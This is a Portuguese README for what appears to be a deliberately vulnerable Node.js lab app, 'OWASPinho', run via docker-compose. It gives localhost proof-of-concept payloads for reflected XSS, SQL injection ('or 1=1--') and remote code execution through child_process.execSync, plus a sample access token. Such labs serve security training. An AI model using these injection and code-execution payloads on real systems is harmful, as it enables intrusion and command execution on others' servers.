# OWASPinho
- [OWASPinho](#owaspinho)
  - [Execução](#execução)
  - [Vulnerabilidades](#vulnerabilidades)
    - [XSS](#xss)
    - [SQL Injection](#sql-injection)
    - [RCE](#rce)

## Execução

```
$ unzip VulnNode-Nome.zip
$ cd VulnNode-Nome
$ docker-compose up
```

![Docker Compose em execução](https://res.cloudinary.com/dtr6hzxnx/image/upload/v1681241692/Via/2023-04-11_16.24.37_kmoglj.gif)

```
http://localhost:3000
``````
![Vulnerable Node Application](images\VulnerableNodeApplication.png)

## Vulnerabilidades 
### XSS
![Cross-Site Script](images\xss.png)
```
/?userInput=<script>alert(1)</script>
```
### SQL Injection

http://localhost:3000/users?username=kid&access-token=CHAVE_MEGASECRETA_QsriGQQbNsLykkfdci9TVutzbT9pfGZpSRMQ6FuhQNeYnZw6 

![SQL Injection](images\sqli.png)
```
/users?username='+or+1=1--&access-token=' 
```
### RCE
![Remote Code Execution](images\rce.png)
```
/users/has-access?userId=1&resourceId=42&userAccessCheck=function(userId,%20resourceId)%20{%20return%20require('child_process').execSync('ping+-c+4+localhost').toString();%20}
```